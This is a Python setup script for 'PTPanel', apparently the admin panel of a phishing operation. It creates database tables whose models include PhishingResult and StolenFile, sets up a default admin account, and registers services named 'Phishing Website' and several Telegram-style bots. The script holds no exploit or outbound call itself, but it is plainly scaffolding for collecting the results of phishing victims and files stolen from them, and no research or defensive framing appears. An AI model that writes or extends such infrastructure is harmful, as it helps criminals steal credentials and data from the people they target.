#!/usr/bin/env python3
"""
PTPanel Database Initialization Script
"""
import sys
import os
import logging

# Add current directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Вимкнути детальне логування SQL
logging.getLogger('sqlalchemy.engine').setLevel(logging.ERROR)

from core.database import db_manager
from models.db_models import Admin, Account, PhishingResult, StolenFile, Service, SystemLog
from core.security import hash_password
from config import config

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def create_default_admin():
    """Create default admin user"""
    print("🔄 Creating default admin user...")
    session = db_manager.get_session()
    try:
        admin = session.query(Admin).filter(Admin.username == config.admin.username).first()
        if not admin:
            admin = Admin(
                username=config.admin.username,
                password_hash=hash_password(config.admin.password),
                is_active=True,
                is_main_admin=True
            )
            session.add(admin)
            session.commit()
            print(f"✅ Admin user created: {config.admin.username}")
            return True
        else:
            print("ℹ️  Admin user already exists")
            return True
    except Exception as e:
        print(f"❌ Failed to create admin user: {e}")
        session.rollback()
        return False
    finally:
        session.close()

def create_default_services():
    """Create default service entries"""
    print("🔄 Creating default services...")
    session = db_manager.get_session()
    try:
        services = [
            Service(name="WebApp Bot", service_type="bot", status="stopped"),
            Service(name="Classic Bot", service_type="bot", status="stopped"),
            Service(name="Multitool Bot", service_type="bot", status="stopped"),
            Service(name="Admin Bot", service_type="bot", status="stopped"),
            Service(name="Phishing Website", service_type="website", status="stopped"),
        ]
        
        for service_data in services:
            service = session.query(Service).filter(Service.name == service_data.name).first()
            if not service:
                session.add(service_data)
        
        session.commit()
        print("✅ Default services created")
    except Exception as e:
        print(f"❌ Failed to create services: {e}")
        session.rollback()
    finally:
        session.close()

def main():
    """Initialize database with default data"""
    print("🚀 Starting PTPanel database initialization...")
    
    try:
        # Create tables
        print("🔄 Creating database tables...")
        db_manager.create_tables()
        print("✅ Database tables created successfully")
        
        # Create default admin
        if not create_default_admin():
            print("❌ Admin creation failed - exiting")
            sys.exit(1)
        
        # Create default services
        create_default_services()
        
        print("🎉 PTPanel database initialization completed successfully!")
        print("\n📊 Next steps:")
        print("   1. Run: python run.py")
        print("   2. Open: http://localhost:5000/admin")
        print("   3. Login with admin credentials")
        
    except Exception as e:
        print(f"❌ Database initialization failed: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()